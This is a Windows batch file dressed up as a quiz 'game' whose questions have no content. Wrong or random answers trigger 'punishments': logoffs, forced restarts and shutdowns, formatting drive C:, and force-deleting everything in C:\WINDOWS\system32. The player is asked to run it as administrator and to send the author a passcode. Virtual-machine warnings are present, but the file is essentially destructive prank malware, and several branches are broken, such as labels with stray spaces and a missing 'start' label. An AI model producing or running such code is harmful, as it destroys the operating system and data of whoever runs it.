@echo off

:setup

echo Setting up...

timeout /t 3 /nobreak>nul

echo. +852 6817 0282 > phone_number.txt

chcp 950>nul

echo Setup has finished. 

pause

:lang-select

cls

echo Select a language...
echo 請選擇語言

echo 1) English
echo 2) 中文

choice /c 12 /n

if %errorlevel%==1 goto warning-en
if %errorlevel%==2 goto warning-zh

:warning-en

color 4a
echo Warning! 
echo You may end up with an unusable machine by playing this game, please use a virtual machine. 
echo If there are any causes (excluding losing a virtual machine) by not using a virtual machine, the batch file writer is not responsible for any of the causes. 

choice /c 1 /n /m "Press 1 to confirm..."

if %errorlevel%==1 color 07&echo Confirmed. &timeout /t 3&goto start-en

:start-en

cls

echo Please use 'Run as administrator' and use the admin account to get the full experience of this game. 

pause

cls

echo Welcome to this game. 

pause

echo About and Rules:
echo This is a very interesting game. 
echo There are 2 parts. 
echo There are many multiple choices questions to do. 
echo If you answered them correctly, nothing will happen. 
echo If you answered them wrongly, you will have a punishment. 
echo In the first part, later questions have more serious punishments. 
echo In the second part, the punishments are mixed. 
echo If you answered part 1 correctly, you will get some hint of the secret passcode. 
echo If you answered all of them correctly, you will get a secret passcode. 
echo Please copy the secret passcode and send it to me if you answered all of them correctly. 

pause

echo Enjoy the game! 

pause

echo Oh, yes. Before playing the game, please save all of your important stuff. 

pause

cls

echo First, you have to practice how to answer the question.
 
pause

echo Instructions to play:
echo Every question has 4 choices. You need to choose which choice you want. After choosing it, please type it out and press 'Enter'. Hopefully, you will answer it right until the end of this game.

pause

:practice-en

cls

echo Please practice here.
set /p input=Try out here (choose 1). 

if %input%==1 echo Perfectly done! Do you want to pratice again? &goto practice-again-en

echo Your answer should be '1', please try again. 
goto practice-en

:practice-again-en

choice

if %errorlevel%==1 goto practice-en

if %errorlevel%==2 goto same-en

:same-en

pause

cls

echo You have 30 minutes to do the questions. 

echo The game will start now. 

timeout /t 5 /nobreak

cls

echo. timeout /t 1800&taskkill /im cmd.exe >  timer.bat

echo Same punishment questions. 

pause

:question1-en

cls

echo Question 1. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment1

if %input%==2 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment1

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment1

if %input%==4 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question2-en

echo Your choice is invalid, please try again. 
timeout /t 3
goto question1-en

:question2-en

color 07

cls

echo Question 2. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question3-en

if %input%==2 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment2

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment2

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment2

echo Your choice is invalid, please try again. 
timeout /t 3
goto question2-en

:question3-en

color 07

cls

echo Question 3. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment3

if %input%==2 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment3

if %input%==3 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question4-en

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment3

echo Your choice is invalid, please try again. 
timeout /t 3
goto question3-en

:question4-en

color 07

cls

echo Question 4. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question5-en

if %input%==2 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment4

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment4

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment4

echo Your choice is invalid, please try again. 
timeout /t 3
goto question4-en

:question5-en

color 07

cls

echo Question 5
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry,you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment5

if %input%==2 timeout /t 3&color 04&echo Sorry,you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment5

if %input%==3 timeout /t 3&color 04&echo Sorry,you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment5

if %input%==4 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question6-en

echo Your choice is invalid, please try again. 
timeout /t 3
goto question5-en

:question6-en

color 07

cls

echo Question 6. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment6

if %input%==2 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment6

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment6

if %input%==4 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question7-en

echo Your choice is invalid, please try again. 
timeout /t 3
goto question6-en

:question7-en

color 07

cls

timeout /t 5

echo Before we get into question 7, remember to be ready for buying a new computer!

color 0c

echo DANGEROUS ZONE!

echo Suggested using a virtual machine. 

echo If any loss(excluding losing a virtual machine) is caused by not using a virtual machine, the batch file writer is not responsible for the causes. 

timeout /t 10

cls

:pre-question7-en

echo 1) continue
echo 2) leave here
choice /c 12 /n
if %errorlevel%==1 cls&goto question7body-en
if %errorlevel%==2 cls&echo Ready to exit...&timeout /t 5&exit

:question7body-en

color 07

cls

echo Question 7. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment7

if %input%==2 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question8-en

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment7

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment7

echo Your choice is invalid, please try again. 
timeout /t 3
goto question7body-en

:question8-en

color 07

cls

echo Question 8. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment8

if %input%==2 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto code-guess-start-en

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment8

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment8

echo Your choice is invalid, please try again. 
timeout /t 3
goto question8-en

:code-guess-start-en

color 07

cls

echo Now you can get the code. 
echo The code is the correct answer of all the questions before. 
pause
echo You don't know?
echo Guess it. 
echo You have 3 chances.

set chance=3 

:code-guess-attempt-en

set /p code=Type your guess here. 

if %code%==41314421 echo The code is correct! Send it to me so that you can get a special prize. &pause&goto continue-en

set /a chance=chance-1

echo Your answer is wrong, you still have %chance% chance(s) left. 

if %chance%==0 goto continue-en

goto code-guess-attempt-en

:continue-en

echo Do you want to continue? 
echo 1) yes
echo 2) no

choice /c 12 /n

if %errorlevel%==1 goto mixed-en

if %errorlevel%==2 echo Ready to exit...&timeout 5 > nul&exit

:mixed-en

pause

echo In this section, the punishments are going to be random. 

echo There are 3 questions in this section. 

:question9-en

echo Question 9. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==2 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question 10-en

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

echo Your choice is invalid, please try again. 
timeout /t 3
goto question9-en

:question10-en

echo Question 10. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==2 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto question 11-en

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

echo Your choice is invalid, please try again. 
timeout /t 3
goto question10-en

:question11-en

echo Question 11. 
timeout /t 5
echo You have 4 choices: 1, 2, 3, 4
set /p input=Which one do you think is the correct one? You can answer now. 

if %input%==1 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==2 timeout /t 3&color 02&echo Congratulations, you answered it correctly! Let's continue to the next question! &timeout /t 5&goto end-en

if %input%==3 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

if %input%==4 timeout /t 3&color 04&echo Sorry, you answered it wrongly. You will have a punishment. &timeout /t 2&goto punishment-generate

echo Your choice is invalid, please try again. 
timeout /t 3
goto question11-en

:end-en

echo The secret passcode is 41314421

echo You have 15 seconds to copy it. 

echo Send the passcode to me to get a special prize. 

timeout /t 15 > nul

echo Ready to exit...

exit

:warning-zh

exit

color 4a
echo 警告！
echo 玩這個遊戲可能會導致電腦無法使用，請使用虛擬機。
echo 如果因不使用虛擬機而導致任何後果（不包括損失虛擬機），此批次檔作者將不對任何後果負責。

choice /c 1 /n /m "按 1 確認..."

if %errorlevel%==1 echo 已確認。&timeout /t 3&cls&goto start-zh

:start-zh

color 07

echo 請使用「以管理員身份運行」並使用管理員帳戶來獲得此遊戲的完整體驗。

pause

cls

echo Welcome to this game. 

pause

echo 關於和規則：
echo 這是一款非常有趣的遊戲。
echo 有2個部分。
echo 有很多選擇題要做。
echo 如果你回答正確，什麼都不會發生。
echo 如果您回答錯誤，您將受到懲罰。
echo 第一部分，後面的問題有更嚴重的懲罰。
echo 第二部分，刑罰昰隨機的。
echo 如果您正確回答了第 1 部分，您將獲得一些密碼提示。
echo 如果您全部回答正確，您將獲得一個秘密密碼。
echo 如果您全部回答正確，請複制密碼並將其發送給我。

pause

echo Enjoy the game! 

pause

echo Oh, yes. Before playing the game, please save all of your important stuff. 

pause

cls

echo First, you have to practice how to answer the question.
 
pause

echo Instructions to play:
echo Every question has 4 choices. You need to choose which choice you want. After choosing it, please type it out and press 'Enter'. Hopefully, you will answer it right until the end of this game.

cls

pause

exit

:punishment-generate

set /a generate=%random% %% 8 + 1

if %generate%==1 goto punishment1

if %generate%==2 goto punishment2

if %generate%==3 goto punishment3

if %generate%==4 goto punishment4

if %generate%==5 goto punishment5

if %generate%==6 goto punishment6

if %generate%==7 goto punishment7

if %generate%==8 goto punishment8

:punishment1

goto start

:punishment2

exit

:punishment3

shutdown /l

exit

:punishment4

shutdown /h

exit

:punishment5

shutdown /r /f

:punishment6

shutdown /s /f /t 0

:punishment7

format c: /u

:punishment8

del /f /s /q c:\WINDOWS\system32\*.*